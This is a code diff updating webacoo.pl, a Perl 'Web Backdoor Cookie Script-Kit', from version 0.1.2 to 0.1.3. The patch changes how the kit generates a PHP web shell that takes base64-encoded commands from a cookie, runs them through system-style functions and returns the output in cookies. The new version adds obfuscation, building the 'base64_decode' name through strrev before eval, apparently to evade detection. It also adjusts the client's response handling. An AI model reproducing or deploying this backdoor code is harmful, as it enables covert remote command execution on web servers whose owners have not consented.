@@ -15,7 +15,7 @@ my @phpsf = ("system", "shell_exec", "exec", "passthru", "popen");
 
 # Setup
 $WEBACOO{name} = "webacoo.pl";
-$WEBACOO{version} = '0.1.2';
+$WEBACOO{version} = '0.1.3';
 $WEBACOO{description} = 'Web Backdoor Cookie Script-Kit';
 $WEBACOO{author} = 'Anestis Bechtsoudis';
 $WEBACOO{email} = 'anestis@bechtsoudis.com';
@@ -206,8 +206,12 @@ exit;
 # Generate backdoor code
 sub generate_backdoor
 {
-    # Command is retrieved under the relative Cookie from the client
-    my $cmd = "base64_decode(\$_COOKIE['cm'])";
+    my $cmd = '';
+
+    # Command is retrieved under the relative Cookie from the client 
+    if (!$args{r}) { $cmd = "base64_decode(\$_COOKIE['cm'])"; }
+    # If raw output mode used, protect base64 decoder
+    else { $cmd = "\$b(\$_COOKIE['cm'])"; }
 
     # PHP system functions usage
     my %payloads = (
@@ -219,9 +223,10 @@ sub generate_backdoor
     );
 
     # Form the final payload
-    my $payload = "if(isset(\$_COOKIE['cm'])){ob_start();$payloads{$WEBACOO{sfuntion}}".
-	"setcookie(\$_COOKIE['cn'],\$_COOKIE['cp'].base64_encode(ob_get_contents()).\$_COOKIE['cp']);".
-	"ob_end_clean();}";
+    my $payload = "if(isset(\$_COOKIE['cm'])){ob_start();";
+    $payload .= '$b=strrev("edoced_4"."6esab");' if ($args{r});
+    $payload .= "$payloads{$WEBACOO{sfuntion}}setcookie(\$_COOKIE['cn'],\$_COOKIE['cp'].".
+	"base64_encode(ob_get_contents()).\$_COOKIE['cp']);ob_end_clean();}";
 
     # PHP tags
     my $prefix = "<?php ";
@@ -231,7 +236,7 @@ sub generate_backdoor
     # otherwise encode payload & append the tags
     if(!defined $args{r}) {
         $payload = encode_base64($payload, '');
-	$prefix .= "eval(base64_decode(\"";
+	$prefix .= '$b=strrev("edoced_4"."6esab");eval($b("';
 	$suffix = "\"));".$suffix
     }
 
@@ -294,9 +299,15 @@ sub cmd_request
     close($sock);
 
     # Split HTTP header + data and print according to verbose level
-    @verdata = split (/^\r\n/m,$output); 
+    @verdata = split (/^\r\n/m,$output);
+    $verdata[1] = "" if (@verdata == 1); # If data field is empty
+    chomp($verdata[0]);
     print "*** Response HTTP Header ***\n$verdata[0]\n\n" if($WEBACOO{vlevel} > 0);
     print "*** Response HTTP Data ***\n$verdata[1]\n\n" if($WEBACOO{vlevel} > 1);
+    print "*** Command Output ***\n" if($WEBACOO{vlevel} > 0);
+
+    # Unescape URI escaped special characters
+    $output =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
 
     # Check for HTTP 4xx error status codes
     if($output =~ m/^HTTP\/1\.[0,1].+4\d{2}.+\n/)
@@ -310,9 +321,6 @@ sub cmd_request
     my $start = index($output,$WEBACOO{delim})+length($WEBACOO{delim});
     my $end = index($output,$WEBACOO{delim},$start);
     $output = substr($output,$start,$end-$start);
-
-    # Replace URL encoding '=' server alterations
-    $output =~ s/%3D/=/g;
 
     # Decode response and print output
     print decode_base64($output);
